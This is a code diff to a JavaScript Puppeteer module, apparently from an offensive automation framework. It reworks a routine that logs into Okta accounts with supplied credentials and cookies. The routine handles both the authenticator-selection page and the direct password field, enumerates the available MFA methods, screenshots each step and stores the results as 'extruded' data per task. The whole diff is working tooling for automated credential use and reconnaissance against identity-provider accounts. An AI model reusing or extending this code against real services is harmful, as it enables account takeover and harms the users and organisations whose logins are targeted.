@@ -108,70 +108,106 @@ exports.LoginAndEnumerate = async ({ page, data: [taskId, cookies, params] }) =>
             await page.click('input.button.button-primary[type="submit"][value="Next"]').catch(console.error)
             await necrohelp.Sleep(3000)
 
-            // Take screenshot of "Verify it's you" page
+            // Take screenshot after clicking Next
             await necrohelp.ScreenshotCurrentPage(page, taskId)
-            await db.AddExtrudedData(taskId, 'step', Buffer.from('03_verify_page').toString('base64'))
+            await db.AddExtrudedData(taskId, 'step', Buffer.from('03_after_next').toString('base64'))
 
-            // Step 3: Check for authentication methods available
-            console.log(`[${taskId}] Checking authentication methods available`)
-            const authMethods = await page.$$('.authenticator-row').catch(() => [])
-            console.log(`[${taskId}] Found ${authMethods.length} authentication methods`)
+            // Step 3: Detect which flow we're in
+            // Okta can show either:
+            // A) Authentication method selection page (.authenticator-row elements)
+            // B) Direct password field (input[name="credentials.passcode"])
 
-            // Capture available auth methods
-            const methodsList = []
-            for (let method of authMethods) {
-                const label = await method.$eval('.authenticator-label', el => el.textContent).catch(() => 'Unknown')
-                const desc = await method.$eval('.authenticator-description--text', el => el.textContent).catch(() => '')
-                methodsList.push({ label: label.trim(), description: desc.trim() })
-                console.log(`[${taskId}]   Auth method: ${label.trim()} - ${desc.trim()}`)
+            console.log(`[${taskId}] Detecting authentication flow...`)
+            const directPasswordField = await page.$('input[name="credentials.passcode"]').catch(() => null)
+
+            if (directPasswordField) {
+                // FLOW B: Direct password field (simpler flow)
+                console.log(`[${taskId}] Detected DIRECT PASSWORD FLOW - password field already visible`)
+                await db.AddExtrudedData(taskId, 'auth_flow', Buffer.from('direct_password').toString('base64'))
+
+                // Save screenshot of direct password page to filesystem
+                const directPasswordPath = await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'direct_password_page')
+                if (directPasswordPath) {
+                    console.log(`[${taskId}] Direct password page screenshot saved to filesystem: ${directPasswordPath}`)
+                }
+
+                // Enter password directly
+                console.log(`[${taskId}] Entering password in direct field`)
+                await page.type('input[name="credentials.passcode"]', password, { delay: 100 })
+                await necrohelp.Sleep(1000)
+
+                // Take screenshot with password entered (masked)
+                await necrohelp.ScreenshotCurrentPage(page, taskId)
+                await db.AddExtrudedData(taskId, 'step', Buffer.from('04_password_entered_direct').toString('base64'))
+
+                // Click Verify button
+                console.log(`[${taskId}] Clicking Verify button`)
+                await page.click('input.button.button-primary[type="submit"][value="Verify"]').catch(console.error)
+
+            } else {
+                // FLOW A: Authentication method selection page
+                console.log(`[${taskId}] Detected AUTH SELECTION FLOW - checking available methods`)
+                await db.AddExtrudedData(taskId, 'auth_flow', Buffer.from('method_selection').toString('base64'))
+
+                const authMethods = await page.$$('.authenticator-row').catch(() => [])
+                console.log(`[${taskId}] Found ${authMethods.length} authentication methods`)
+
+                // Capture available auth methods
+                const methodsList = []
+                for (let method of authMethods) {
+                    const label = await method.$eval('.authenticator-label', el => el.textContent).catch(() => 'Unknown')
+                    const desc = await method.$eval('.authenticator-description--text', el => el.textContent).catch(() => '')
+                    methodsList.push({ label: label.trim(), description: desc.trim() })
+                    console.log(`[${taskId}]   Auth method: ${label.trim()} - ${desc.trim()}`)
+                }
+                await db.AddExtrudedData(taskId, 'auth_methods', Buffer.from(JSON.stringify(methodsList)).toString('base64'))
+
+                // Save authentication methods list to filesystem BEFORE clicking on Password
+                const authMethodsPath = await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'auth_methods_list')
+                if (authMethodsPath) {
+                    console.log(`[${taskId}] Authentication methods list screenshot saved to filesystem: ${authMethodsPath}`)
+                }
+
+                // Try to select Password authentication
+                console.log(`[${taskId}] Looking for Password authentication option`)
+                const passwordButton = await page.$('div[data-se="okta_password"] a.select-factor').catch(() => null)
+
+                if (!passwordButton) {
+                    // Password not available, check for MFA requirement
+                    console.log(`[${taskId}] Password option not found, checking for other MFA requirements`)
+                    await checkForMFA(page, taskId)
+                    // If MFA is required and we can't proceed, stop here
+                    const errorMsg = "Password authentication not available. MFA may be required."
+                    console.log(`[${taskId}] ${errorMsg}`)
+                    await db.UpdateTaskStatusWithReason(taskId, "error", errorMsg)
+                    return
+                }
+
+                // Click Password select button
+                console.log(`[${taskId}] Selecting Password authentication`)
+                await passwordButton.click()
+                await necrohelp.Sleep(3000)
+
+                // Take screenshot of password entry page
+                await necrohelp.ScreenshotCurrentPage(page, taskId)
+                await db.AddExtrudedData(taskId, 'step', Buffer.from('04_password_page').toString('base64'))
+
+                // Enter password
+                console.log(`[${taskId}] Entering password`)
+                await page.waitForSelector('input[name="credentials.passcode"]', { timeout: 10000 })
+                await page.type('input[name="credentials.passcode"]', password, { delay: 100 })
+                await necrohelp.Sleep(1000)
+
+                // Take screenshot with password entered (masked)
+                await necrohelp.ScreenshotCurrentPage(page, taskId)
+                await db.AddExtrudedData(taskId, 'step', Buffer.from('05_password_entered').toString('base64'))
+
+                // Click Verify button
+                console.log(`[${taskId}] Clicking Verify button`)
+                await page.click('input.button.button-primary[type="submit"][value="Verify"]').catch(console.error)
             }
-            await db.AddExtrudedData(taskId, 'auth_methods', Buffer.from(JSON.stringify(methodsList)).toString('base64'))
 
-            // Save authentication methods list to filesystem BEFORE clicking on Password
-            const authMethodsPath = await necrohelp.ScreenshotCurrentPageToFS(page, taskId, 'auth_methods_list')
-            if (authMethodsPath) {
-                console.log(`[${taskId}] Authentication methods list screenshot saved to filesystem: ${authMethodsPath}`)
-            }
-
-            // Step 4: Try to select Password authentication
-            console.log(`[${taskId}] Looking for Password authentication option`)
-            const passwordButton = await page.$('div[data-se="okta_password"] a.select-factor').catch(() => null)
-
-            if (!passwordButton) {
-                // Password not available, check for MFA requirement
-                console.log(`[${taskId}] Password option not found, checking for other MFA requirements`)
-                await checkForMFA(page, taskId)
-                // If MFA is required and we can't proceed, stop here
-                const errorMsg = "Password authentication not available. MFA may be required."
-                console.log(`[${taskId}] ${errorMsg}`)
-                await db.UpdateTaskStatusWithReason(taskId, "error", errorMsg)
-                return
-            }
-
-            // Click Password select button
-            console.log(`[${taskId}] Selecting Password authentication`)
-            await passwordButton.click()
-            await necrohelp.Sleep(3000)
-
-            // Take screenshot of password entry page
-            await necrohelp.ScreenshotCurrentPage(page, taskId)
-            await db.AddExtrudedData(taskId, 'step', Buffer.from('04_password_page').toString('base64'))
-
-            // Step 5: Enter password
-            console.log(`[${taskId}] Entering password`)
-            await page.waitForSelector('input[name="credentials.passcode"]', { timeout: 10000 })
-            await page.type('input[name="credentials.passcode"]', password, { delay: 100 })
-            await necrohelp.Sleep(1000)
-
-            // Take screenshot with password entered (masked)
-            await necrohelp.ScreenshotCurrentPage(page, taskId)
-            await db.AddExtrudedData(taskId, 'step', Buffer.from('05_password_entered').toString('base64'))
-
-            // Step 6: Click Verify button
-            console.log(`[${taskId}] Clicking Verify button`)
-            await page.click('input.button.button-primary[type="submit"][value="Verify"]').catch(console.error)
-
-            // Wait for page transition after clicking Verify
+            // Wait for page transition after clicking Verify (common for both flows)
             // This is critical because Okta can redirect to either:
             // 1. Dashboard (if no MFA)
             // 2. MFA prompt page (if MFA required)
